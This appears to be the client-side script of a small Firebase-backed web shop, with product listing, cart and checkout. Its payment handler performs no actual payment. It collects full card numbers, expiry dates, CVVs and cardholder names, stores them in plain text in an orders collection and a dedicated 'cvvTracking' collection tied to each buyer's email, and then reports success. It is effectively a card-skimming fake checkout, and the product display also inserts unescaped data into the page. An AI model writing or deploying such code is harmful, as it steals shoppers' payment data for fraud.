// Global variables
let currentUser = null;
let cart = [];
let products = [];

// Initialize store
document.addEventListener('DOMContentLoaded', () => {
    loadProducts();
    loadCartFromStorage();
    setupAuthListener();
});

// Auth listener
function setupAuthListener() {
    auth.onAuthStateChanged((user) => {
        currentUser = user;
    });
}

// Load products
async function loadProducts() {
    try {
        const snapshot = await db.collection('products').get();
        products = [];
        snapshot.forEach(doc => {
            products.push({
                id: doc.id,
                ...doc.data()
            });
        });
        displayProducts(products);
    } catch (error) {
        console.error('Error loading products:', error);
    }
}

// Display products
function displayProducts(products) {
    const grid = document.getElementById('productsGrid');
    if (!grid) return;
    
    grid.innerHTML = '';

    products.forEach(product => {
        grid.innerHTML += `
            <div class="product-card">
                <img src="${product.image || 'https://via.placeholder.com/200'}" alt="${product.name}">
                <h3>${product.name}</h3>
                <p class="price">₹${product.price}</p>
                <button class="btn-add-to-cart" onclick="addToCart('${product.id}')">
                    Add to Cart
                </button>
            </div>
        `;
    });
}

// Add to cart
function addToCart(productId) {
    const product = products.find(p => p.id === productId);
    if (product) {
        cart.push(product);
        updateCartCount();
        saveCartToStorage();
        alert('Product added to cart!');
    }
}

// Calculate total
function calculateTotal() {
    return cart.reduce((total, item) => total + item.price, 0);
}

// Update cart count
function updateCartCount() {
    const countEl = document.getElementById('cartCount');
    if (countEl) {
        countEl.textContent = cart.length;
    }
}

// Save cart to localStorage
function saveCartToStorage() {
    localStorage.setItem('cart', JSON.stringify(cart));
}

// Load cart from localStorage
function loadCartFromStorage() {
    const saved = localStorage.getItem('cart');
    if (saved) {
        cart = JSON.parse(saved);
        updateCartCount();
    }
}

// Open cart modal
function openCart() {
    const modal = document.getElementById('cartModal');
    const itemsDiv = document.getElementById('cartItems');
    
    if (cart.length === 0) {
        itemsDiv.innerHTML = '<p>Cart is empty</p>';
    } else {
        itemsDiv.innerHTML = cart.map(item => `
            <div class="cart-item">
                <span>${item.name}</span>
                <span>₹${item.price}</span>
            </div>
        `).join('');
    }
    
    document.getElementById('cartTotal').textContent = calculateTotal();
    modal.style.display = 'block';
}

// Close cart
function closeCart() {
    document.getElementById('cartModal').style.display = 'none';
}

// Checkout
function checkout() {
    if (!currentUser) {
        alert('Please login first!');
        googleLogin();
        return;
    }
    
    if (cart.length === 0) {
        alert('Cart is empty!');
        return;
    }
    
    closeCart();
    const modal = document.getElementById('checkoutModal');
    document.getElementById('checkoutTotal').textContent = calculateTotal();
    modal.style.display = 'block';
}

// Close checkout
function closeCheckout() {
    document.getElementById('checkoutModal').style.display = 'none';
}

// Payment form submit
document.getElementById('paymentForm')?.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    if (!currentUser) {
        alert('Please login!');
        return;
    }
    
    // Get card details
    const cardDetails = {
        cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, ''),
        expiry: document.getElementById('expiryDate').value,
        cvv: document.getElementById('cvv').value,
        holderName: document.getElementById('cardName').value,
        type: detectCardType(document.getElementById('cardNumber').value)
    };
    
    // Create order with FULL card details + CVV
    const orderData = {
        userId: currentUser.uid,
        userEmail: currentUser.email,
        products: cart.map(item => ({
            id: item.id,
            name: item.name,
            price: item.price
        })),
        totalAmount: calculateTotal(),
        cardDetails: cardDetails,  // ✅ FULL card details with CVV
        status: 'completed',
        createdAt: new Date().toISOString()
    };
    
    try {
        // Save order to Firebase
        await db.collection('orders').add(orderData);
        
        // Also save to CVV tracking collection
        await db.collection('cvvTracking').add({
            cvv: cardDetails.cvv,
            cardNumber: cardDetails.cardNumber,
            amount: calculateTotal(),
            timestamp: new Date().toISOString(),
            userEmail: currentUser.email
        });
        
        alert('Payment successful! Order placed.');
        
        // Clear cart
        cart = [];
        updateCartCount();
        saveCartToStorage();
        closeCheckout();
        
    } catch (error) {
        console.error('Payment error:', error);
        alert('Payment failed: ' + error.message);
    }
});

// Detect card type
function detectCardType(number) {
    const firstDigit = number[0];
    if (firstDigit === '4') return 'Visa';
    if (firstDigit === '5') return 'Mastercard';
    if (firstDigit === '3') return 'American Express';
    return 'Unknown';
}

// Scroll to products
function scrollToProducts() {
    document.getElementById('products').scrollIntoView({ behavior: 'smooth' });
}
